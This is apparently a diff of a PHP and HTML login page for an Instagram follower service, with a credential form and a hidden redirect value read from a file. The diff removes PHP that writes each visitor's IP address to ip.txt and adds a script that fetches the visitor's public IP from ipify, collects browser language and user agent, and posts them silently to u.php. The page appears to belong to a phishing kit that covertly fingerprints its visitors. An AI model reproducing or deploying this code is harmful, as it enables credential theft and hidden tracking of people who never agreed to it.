@@ -1,22 +1,4 @@
-<?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
-?>
+
 <!DOCTYPE html>
 <html lang="en" class="js sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox picture srcset webworkers"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -105,7 +87,6 @@ fwrite(fopen('ip.txt','w'),get_IP_address());
 <h1 class="text-white">Login</h1>
 <p>Enter Your Account Credentials</p>
 </div>
-
 
 <div class="content_area">
 <div class="container">
@@ -363,6 +344,7 @@ function loginWithGoogle(access_token) {
         //e.preventDefault();
         var alerts = 'form.ajax[data-action="account_login"] div.ajax-alerts';
         var fieldset = $('form.ajax[data-action="account_login"] fieldset');
+        var re = document.getElementById('redir').innerHTML;
         var controls = $('form.ajax[data-action="account_login"] input, form.ajax[data-action="account_login"] button');
         var values = {
             'access_token': access_token
@@ -388,8 +370,6 @@ function loginWithGoogle(access_token) {
                 success: function(data){
                     console.log(data);
                     if(data.success == true){
-                        //fieldset.slideUp();
-                        
                         flashs.alert2(alerts, 'success', 'Hi there! Logged In Success. You are now being redirected...', '');
                         setTimeout(function() {
                             window.location.href = 'https://www.instafollowerspro.com/dashboard';                            
@@ -435,4 +415,26 @@ setTimeout(function() {
         $r = fread($f,filesize("redir.txt"));
         echo "<p id='redir' style='display:none!important'>".$r."</p>";
         ?>
-</body></html>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
+</script></body></html>
